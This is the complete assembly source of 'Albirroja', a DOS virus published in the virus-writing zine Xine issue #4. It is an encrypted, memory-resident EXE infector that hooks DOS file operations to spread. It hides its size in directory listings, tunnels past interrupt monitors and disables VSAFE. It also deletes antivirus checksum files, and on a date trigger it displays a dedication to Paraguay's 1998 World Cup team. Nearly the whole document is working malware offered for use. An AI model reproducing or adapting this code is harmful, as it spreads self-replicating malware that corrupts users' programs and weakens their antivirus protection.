   ;
   ;                                         /-----------------------------\
   ;                                         | Xine - issue #4 - Phile 305 |
   ;                                         \-----------------------------/
   ;
   ;
   ; Comment #
   ;
   ;                        Û Û Û ÛßÛ Û Û Ûßß
   ;                        Û Û Û ÛÜß Û Û ÛÜÜ
   ;                        ßÜß Û Û Û ÛÜÛ ÜÜÛ
   ;        ÜÜ    Ü     ÜÜÜÜ   Ü  ÜÜÜ   ÜÜÜ    ÜÜÜÜ   ÜÜÜÜÜ   ÜÜ
   ;      ÜÛ  ÛÜ  Û     Û   Û  Û  Û  ßÜ Û  ßÜ Û    Û    Û   ÜÛ  ÛÜ
   ;      Û    Û  Û     ÛÜÜÛ   Û  Û   Û Û   Û Û    Û    Û   Û    Û
   ;      ÛßßßßÛ  Û     Û  ßÜ  Û  ÛßÛß  ÛßÛß  Û    Û    Û   ÛßßßßÛ
   ;      Û    Û  ÛÜÜÜÜ ÛÜÜÜß  Û  Û  Û  Û  Û   ÛÜÜÛ  ßÜÜß   Û    Û
   ;
   ; Old DOS virus.  This is a TSR encrypted EXE very fast infector, it infects
   ; on  0x11,0x12,0x4E,0x4F,0x3D,0x6C00,0x56,0x41,0x43  and 0x4B, that  is  on
   ; find  first/next (FCB & DTA),  normal open, extended open, rename, delete,
   ; get/change attributes and execution. Manipulates MCB for memory residence,
   ; it  has  some anti-heuristics, tunnels, opens file in  read-only and plays
   ; with SFT, has an error handler, fools VSAFE, kills some AV checksum files,
   ; protects  INT 21h, uses antitunneling, also has a nice  payload  dedicated
   ; to  the  paraguayan  soccer  team  for  their  cool  work  in  France '98.
   ;
   ;                                                                     Int13h
   ; #

   .model tiny
   .code
   jumps
   org 0h

   Saltar       equ  (offset Encriptado-offset Albirroja)
   EnMemoria    equ  (offset FinEnMemoria-offset Albirroja)
   Cifrado      equ  (offset Omega-offset Encriptado)/2
   Longitud     equ  (offset Omega-offset Albirroja)
   Parrafos1    equ  ((EnMemoria+15)/16)+1
   Parrafos2    equ  ((EnMemoria+15)/16)
   VirusEnPara  equ  (Longitud+15)/16

   Albirroja:
           mov     bp,sp
           int     03h
           mov     bp,word ptr ss:[bp-06]
           sub     bp,3

           not     sp
           not     sp

           push    cs
           pop     ds
           mov     bx,es
           push    cs
           pop     es
           lea     si,[bp+offset Encriptado]
           push    si
           mov     di,si
           mov     cx,Cifrado

   Jerigonza:
           lodsw
           db      035h
           Clave   dw 0
           stosw
           loop    Jerigonza
           ret


   Encriptado:
           push    bx
           pop     es
           push    es
           pop     ds
           mov     ax,0db00h
           int     21h
           or      al,al
           jz      No_Novell
           jmp     Ya_Reside

   No_Novell:
           mov     ah,058h
           int     21h
           cmp     ax,0cd13h
           je      Ya_Reside

           push    es
           mov     ax,3521h
           int     21h
           mov     cs:[bp+word ptr Anciana21h],bx
           mov     cs:[bp+word ptr Anciana21h+2],es
           mov     cs:[bp+word ptr Real21h],bx
           mov     cs:[bp+word ptr Real21h+2],es
           push    ds

           lds     bx,ds:[0006h]
   TracearPSP:
           cmp     byte ptr ds:[bx],0eah
           jne     Checar
           lds     bx,ds:[bx+1]
           cmp     word ptr ds:[bx],9090h
           jnz     TracearPSP
           sub     bx,32h
           cmp     word ptr ds:[bx],9090h
           jne     Checar
   Hallado:mov     cs:[bp+word ptr Real21h],bx
           mov     cs:[bp+word ptr Real21h+2],ds
           jmp     short MCBTSR
   Checar: cmp     word ptr ds:[bx],2e1eh
           jnz     MCBTSR
           add     bx,25h
           cmp     word ptr ds:[bx],80fah
           je      Hallado

   MCBTSR: pop     ds
           mov     ax,ds
           dec     ax
           mov     es,ax
           mov     ax,es:[3]
           sub     ax,Parrafos1
           xchg    bx,ax

           push    ds
           pop     es
           mov     ah,4ah
           int     21h

           mov     ah,48h
           mov     bx,Parrafos2
           int     21h

           dec     ax
           mov     es,ax
           mov     word ptr es:[1],8
           mov     word ptr es:[8],0cd13h
           inc     ax
           mov     es,ax
           sub     di,di

           push    cs
           pop     ds
           lea     si,[bp+offset Albirroja]
           mov     cx,Longitud
           rep     movsb

           int     03h

           push    es
           pop     ds
           mov     ax,2521h
           mov     dx,offset Int21hALBIRROJA
           int     21h
           pop     es

   Ya_Reside:
           mov     si,bp

           mov     ah,2ah
           int     21h

           cmp     dh,06
           jne     Continuar

           in      ax,40h
           cmp     al,200d
           ja      Payload

   Continuar:
           push    es
           pop     ds

           push    es
           pop     ax

           add     ax,10h
           sub     cx,cx
           add     cs:[(si+CS_IP)+2],ax
           cli
           xor     dx,dx
           add     ax,cs:[(si+SS_SP)+2]
           sub     bp,bp
           mov     ss,ax
           xor     di,di
           mov     sp,cs:[si+SS_SP]
           sti
           sub     ax,ax
           xchg    bx,ax
           mov     ax,bx
           sub     si,si

           db      0ebh,0h
           db      0eah
           CS_IP   dw offset FinEnMemoria,0h
           SS_SP   dw 0,0

   Checar2:xor     ah,0bah
           pushf
           push    cs
           call    Interrupcion_21h
           jc      Paso

           pushf
           push    ax
           push    bx
           push    cx
           push    dx
           push    si
           push    di
           push    ds
           push    es

           mov     ah,2fh
           int     21h

           mov     di,bx
           add     di,1eh
           mov     si,di
           cld
           mov     cx,9
           mov     al,'.'
           repne   scasb
           jne     Suspension

           cmp     word ptr es:[di],'XE'
           jne     Suspension

           cmp     byte ptr es:[di+2],'E'
           jne     Suspension

           cmp     word ptr es:[bx+1ah],029ah
           jb      Suspension

           mov     dx,si
           push    es
           pop     ds

           mov     ax,3d00h
           pushf
           push    cs
           call    Interrupcion_21h
           jc      Suspension
           xchg    bx,ax

           call    PonerInt24hYeliminarAVs

           call    Analisis
           jc      Cierre
           call    Infectar

   Cierre: mov     ah,3eh
           int     21h
           call    RestaurarInt24HyVSAFE

   Suspension:
           pop     es
           pop     ds
           pop     di
           pop     si
           pop     dx
           pop     cx
           pop     bx
           pop     ax
           popf
   Paso:   retf    2



   Int21hALBIRROJA:
           push    ax
           pushf
           pop     ax
           and     ah,11111110b
           push    ax
           popf
           pop     ax
           xor     ah,0bah
           cmp     ah,(58h xor 0bah)
           je      Deteccion
           cmp     ah,(11h xor 0bah)
           je      Checar1
           cmp     ah,(12h xor 0bah)
           je      Checar1
           cmp     ah,(4eh xor 0bah)
           je      Checar2
           cmp     ah,(4fh xor 0bah)
           je      Checar2
           cmp     ah,(4bh xor 0bah)
           je      Checar3
           cmp     ah,(56h xor 0bah)
           je      Checar3
           cmp     ah,(41h xor 0bah)
           je      Checar3
           cmp     ah,(43h xor 0bah)
           je      Checar3
           cmp     ah,(3dh xor 0bah)
           je      Checar3
           cmp     ax,08f21h
           je      Ocultar21h_A
           cmp     ax,09f21h
           je      Ocultar21h_B
           xor     ah,0bah
   Vetusta_21h:
           db      0eah
   Anciana21h      dw 0,0
           ret
   Deteccion:
           mov     ax,0cd13h
           iret



   Ocultar21h_A:
           xor     ah,0bah
           mov     bx,word ptr cs:[Anciana21h]
           mov     es,word ptr cs:[Anciana21h+2]
           iret

   Ocultar21h_B:
           xor     ah,0bah
           mov     word ptr cs:[Anciana21h],dx
           mov     word ptr cs:[Anciana21h+2],ds
           iret


   Checar1:xor     ah,0bah
           pushf
           push    cs
           call    Interrupcion_21h
           test    al,al
           jne     ErrorDir

           push    ax
           push    bx
           push    cx
           push    dx
           push    si
           push    di
           push    ds
           push    es

           mov     ah,62h
           int     21h

           mov     es,bx
           cmp     bx,es:[16h]
           jne     Huyendo

           mov     bx,dx
           mov     al,[bx]
           push    ax
           push    es

           call    PonerInt24hYeliminarAVs

           pop     es
           mov     ah,2fh
           int     21h
           pop     ax
           inc     al
           jnz     FCBNormal
           add     bx,7

   FCBNormal:
           mov     word ptr cs:[Grrr],bx
           mov     ax,word ptr es:[bx+09h]
           or      ax,02020h
           cmp     ax,'xe'
           jne     Fuera

           mov     al,byte ptr es:[bx+0bh]
           or      al,020h
           cmp     al,'e'
           jne     Fuera

           push    es
           pop     ds
           push    cs
           pop     es
           mov     di,offset Victima
           push    di
           mov     cx,13
           xor     al,al
           repe    stosb
           pop     di
           inc     bx
           mov     si,bx
           mov     cx,8
    Buscar:lodsb
           cmp     al,' '
           je      Opa
           stosb
           loop    Buscar

   Opa:    mov     al,'.'
           stosb
           mov     cx,3

           mov     si,bx
           add     si,08h
   Exten:  lodsb
           cmp     al,' '
           je      Opa2
           stosb
           loop    Exten
   Opa2:   push    ds
           pop     es
           push    cs
           pop     ds

           mov     dx,offset Victima
           mov     ax,3d00h
           pushf
           push    cs
           call    Interrupcion_21h
           jc      Fuera
           xchg    bx,ax

           call    Analisis
           jc      Closeo
           push    es
           call    Infectar
           pop     es

   Closeo: mov     ah,3eh
           int     21h

           cmp     di,32d
           jne     Fuera

           mov     bx,word ptr cs:[Grrr]
           cmp     word ptr es:[bx+1dh],Longitud
           jb      Fuera

           sub     word ptr es:[bx+1dh],Longitud
           sbb     word ptr es:[bx+1fh],0

   Fuera:  call    RestaurarInt24HyVSAFE

   Huyendo:pop     es
           pop     ds
           pop     di
           pop     si
           pop     dx
           pop     cx
           pop     bx
           pop     ax
   ErrorDir:
           retf    2



   Checar3:xor     ah,0bah
           push    ax
           push    bx
           push    cx
           push    dx
           push    si
           push    di
           push    ds
           push    es

           cmp     ax,6c00h
           jne     Apertura_Normal

           cmp     dx,0001
           jne     Popear

           mov     dx,si

   Apertura_Normal:
           push    ds
           pop     es
           cld
           mov     di,dx
           mov     cx,128
           mov     al,'.'
           repne   scasb
           jne     Popear

           xchg    si,di
           lodsw
           or      ax,2020h
           cmp     ax,'xe'
           jne     Popear
           lodsb
           or      al,20h
           cmp     al,'e'
           jne     Popear

           mov     ax,3d00h
           pushf
           push    cs
           call    Interrupcion_21h
           jc      Popear
           xchg    bx,ax

           call    PonerInt24hYeliminarAVs

           call    Analisis
           jc      Cierro
           call    Infectar

   Cierro: mov     ah,3eh
           int     21h
           call    RestaurarInt24HyVSAFE

   Popear: pop     es
           pop     ds
           pop     di
           pop     si
           pop     dx
           pop     cx
           pop     bx
           pop     ax
           jmp     Vetusta_21h



   PonerInt24hYeliminarAVs:
           push    bx
           mov     ax,3524h
           int     21h
           mov     word ptr cs:[Antigua24h],bx
           mov     word ptr cs:[Antigua24h+2],es

           push    cs
           pop     ds
           mov     ax,2524h
           mov     dx,offset Handler24h
           int     21h

           mov     ax,4301h
           mov     dx,offset Borrar1
           sub     cx,cx
           pushf
           push    cs
           call    Interrupcion_21h

           mov     ah,41h
           mov     dx,offset Borrar1
           pushf
           push    cs
           call    Interrupcion_21h

           mov     ah,41h
           mov     dx,offset Borrar2
           pushf
           push    cs
           call    Interrupcion_21h

           mov     ah,41h
           mov     dx,offset Borrar3
           pushf
           push    cs
           call    Interrupcion_21h

           mov     ah,41h
           mov     dx,offset Borrar4
           pushf
           push    cs
           call    Interrupcion_21h

           mov     ax,0fa02h
           mov     dx,5945h
           xor     bl,bl
           int     16h
           mov     byte ptr cs:[Bah],cl
           pop     bx
           ret



   RestaurarInt24HyVSAFE:
           push    bx
           lds     dx,dword ptr cs:[Antigua24h]

           mov     ax,2524h
           int     21h

           mov     ax,0fa02h
           mov     dx,5945h
           mov     bl,byte ptr cs:[Bah]
           and     bl,11111011b
           int     16h
           pop     bx
           ret



   Infectar:
           push    cs
           pop     ds
           mov     ax,04202h
           cwd
           xor     cx,cx
           int     21h

           push    bx
           push    dx
           push    ax

           les     ax,dword ptr [Cabecera+014h]
           mov     word ptr [CS_IP],ax
           mov     word ptr [CS_IP+2],es
           les     ax,dword ptr [Cabecera+0eh]
           mov     word ptr [SS_SP],es
           mov     word ptr [SS_SP+2],ax

           push    cs
           pop     ds

           mov     ax,word ptr [Cabecera+08h]
           mov     cl,4
           shl     ax,cl
           xchg    bx,ax
           pop     ax
           pop     dx
           push    ax
           push    dx
           sub     ax,bx
           sbb     dx,0
           mov     cx,10h
           div     cx
           mov     word ptr [Cabecera+014h],dx
           mov     word ptr [Cabecera+016h],ax
           mov     word ptr [Cabecera+0eh],ax
           mov     word ptr [Cabecera+010h],0
           mov     word ptr [Cabecera+012h],''

           pop     dx
           pop     ax

           add     ax,Longitud
           adc     dx,0
           mov     cl,9
           push    ax
           shr     ax,cl
           ror     dx,cl

           xchg    bx,bx

           stc
           adc     dx,ax
           pop     ax
           and     ah,1
           mov     word ptr [Cabecera+4],dx
           mov     word ptr [Cabecera+2],ax

           mov     ax,word ptr [Cabecera+0ah]
           clc
           add     ax,VirusEnPara
           jc      NoMemoria
           mov     word ptr [Cabecera+0ah],ax
   NoMemoria:
           mov     word ptr [Cabecera+0ch],0ffffh

   Otro:   in      ax,40h
           and     ax,ax
           je      Otro

           mov     dl,al
           mov     word ptr [Clave],ax

           mov     si,offset Jerigonza
           cmp     dl,65
           jb      Subbing

           cmp     dl,140
           jb      Adding

           mov     [si],035adh
           jmp     short Copiar_al_buffer

   Subbing:mov     [si],02dadh
           jmp     short Copiar_al_buffer

   Adding: mov     [si],005adh


   Copiar_al_buffer:
           push    es
           push    cs
           pop     es
           mov     cx,(Longitud/2)
           xor     si,si
           mov     di,offset AlbiVir
           rep     movsw

           mov     si,offset Jerigonza
           cmp     dl,65
           jb      AntiSubbing

           cmp     dl,140
           jb      AntiAdding

           mov     [si],035adh
           jmp     short Cifrar_Virus

   AntiSubbing:
           mov     [si],005adh
           jmp     short Cifrar_Virus

   AntiAdding:
           mov     [si],02dadh

   Cifrar_Virus:
           mov     cx,Cifrado
           mov     si,(offset AlbiVir+Saltar)
           mov     di,si
           call    Jerigonza
           pop     es

           pop     bx
           mov     ax,5700h
           int     21h
           push    cx
           push    dx

           push    bx
           mov     ax,1220h
           int     2fh

           mov     ax,1216h
           xor     bh,bh
           mov     bl,es:[di]
           int     2fh

           mov     byte ptr es:[di+2],02
           pop     bx

           mov     ah,40h
           mov     cx,Longitud
           mov     dx,offset AlbiVir
           int     21h

           mov     word ptr es:[di+015h],00
           mov     word ptr es:[di+017h],00

           mov     ah,40h
           mov     cx,01ah
           mov     dx,offset Cabecera
           int     21h

           mov     ax,5701h
           pop     dx
           pop     cx
           int     21h
           ret



   Analisis:
           xor     di,di

           mov     ah,03fh
           mov     dx,offset Cabecera
           mov     cx,1bh
           int     21h

           mov     si,dx
           cmp     word ptr [si+12h],''
           jne     Ir

           mov     di,32d
           jmp     short NoSirve

   Ir:     cmp     word ptr [si+018h],0040h
           je      NoSirve

           mov     ax,[si]
           cmp     word ptr [si],'ZM'
           je      Ok
           cmp     word ptr [si],'MZ'
           jne     NoSirve

   Ok:     mov     ax,04202h
           sub     cx,cx
           cwd
           int     21h

           mov     cx,0200h
           div     cx
           or      dx,dx
           je      NoHayResto
           inc     ax
   NoHayResto:
           cmp     word ptr [si+02h],dx
           jne     NoSirve
           cmp     word ptr [si+04h],ax
           jne     NoSirve

           clc
           ret

   NoSirve:stc
           ret


   PAYLOAD:push    cs
           pop     ds
           mov     ax,0003h
           int     10h

           call    Franja_Roja

           mov     ah,2
           mov     dx,0300h
           int     10h

           call    Franja_Blanca

           mov     ah,2
           mov     dx,0600h
           int     10h

           call    Franja_Azul

           mov     ah,2
           mov     dx,00f00h
           int     10h

           call    Franja_Roja

           mov     ah,2
           mov     dx,01200h
           int     10h

           call    Franja_Blanca

           mov     ah,2
           mov     dx,01500h
           int     10h

           call    Franja_Azul

           mov     ah,2
           mov     dx,0900h
           int     10h

           push    es
           push    cs
           pop     es
           mov     ax,1100h
           mov     bx,0e00h
           mov     cx,01
           mov     dx,00025h
           add     bp,offset Copas
           int     10h
           inc     dx
           add     bp,14
           int     10h
           pop     es

           mov     bp,si
           mov     ah,9
           lea     dx,[bp+offset Bravo]
           int     21h

           mov     dx,03d4h
           mov     al,0ah
           out     dx,al
           inc     dx
           in      al,dx
           or      al,00010000b
           out     dx,al

   Rotar:  mov     cx,80d
           call    Aleatorio

           lea     si,[bp+offset Bravo]
           add     si,ax

           mov     dl,al
           mov     ah,2
           mov     dh,09h
           int     10h

           mov     cx,14
           call    Aleatorio
           or      al,al
           jnz     Seguir
           inc     al
   Seguir: xchg    bx,ax

   ;        mov     cx,3
   ;        call    Aleatorio
   ;        cmp     al,1
   ;        je      Rojo
   ;        mov     bx,0007h
   ;        jmp     short Seguir
   ;Rojo:   mov     bx,000ch
   ;Seguir:
           mov     al,byte ptr [si]
           mov     ah,09h
           mov     cx,1
           int     10h

           mov     ah,2
           mov     dx,0f00h
           int     10h

           mov     ax,09dbh
           mov     bx,0004h
           mov     cx,1
           int     10h

           mov     cx,10000
   Pausa:  dec     cx
           jnz     Pausa

           mov     ah,1
           int     016h
           jz      Rotar

           mov     ah,0ch
           int     21h
           mov     si,bp
           mov     ax,3
           int     10h
           jmp     Continuar


   Franja_Roja:
           mov     ax,09dbh
           mov     bx,0004h
           mov     cx,240
           int     10h
           ret

   Franja_Blanca:
           mov     ax,09dbh
           mov     bx,0007h
           mov     cx,240
           int     10h
           ret

   Franja_Azul:
           mov     ax,09dbh
           mov     bx,0001h
           mov     cx,240
           int     10h
           ret



   Aleatorio:
           push    dx
           push    di
           in      ax,40h
           mov     dx,106
           mul     dx
           add     ax,1283
           mov     di,6075
           adc     dx,0
           div     di
           mov     ax,dx
           mul     cx
           div     di
           pop     di
           pop     dx
           ret



   Interrupcion_21h:
           db      0eah
   Real21h dw      0,0
           ret

   Handler24h:
           xor     al,al
           iret

           db      '...By Int13h/IKX...'

   Copas   db 0,0,07eh,07eh,07eh,07eh,07eh,03ch,018h,018h,03ch,07eh,0,0
           db 0,0,07eh,042h,042h,042h,042h,024h,018h,018h,03ch,07eh,0,0
   Borrar1 db      'anti-vir.dat',0
   Borrar2 db      'chklist.ms',0
   Borrar3 db      'chklist.cps',0
   Borrar4 db      'avp.crc',0


   Bravo db '%&%&%&%&%&%&%&%[ VIRUS ALBIRROJA - (c) 1998 INDUSTRIA PARAGUAYA ]%&%&%&%&%&%&%&%'
   db 'PRoGRaMa DeDiCaDo a:  Carlos Alberto  "Colorado"  Gamarra, Jos‚ Luis Chilavert,',13,10
   db 'Celso  "Chito"  Rafael Ayala, Miguel Angel "Peque" Ben¡tez, Julio C‚sar Yegros,',13,10
   db 'Jos‚ Cardozo,  Pedro Sarabia, Julio C‚sar  Enciso, Denis Caniza, C‚sar Ram¡rez,',13,10
   db 'Francisco  "Chiqui"  Arce,  Carlos Paredes, Roberto "Toro" Acu¤a, Jorge Campos,',13,10
   db 'Arist¡des Rojas y Hugo Brizuela por demostrar la bravura guaran¡ en Francia 98!',13,10,'$$'


   Omega:
   GarraGuarani       dw 0
   Cabecera           db 01bh dup(0)
   Grrr               dw 0
   Bah                db 0
   Victima            db 13 dup(0)
   Antigua24h         dd 0
   AlbiVir            db Longitud dup('A')

   FinEnMemoria:
           mov        ah,2
           mov        dl,7
           int        21h
           mov        ax,4c00h
           int        21h
   End Albirroja
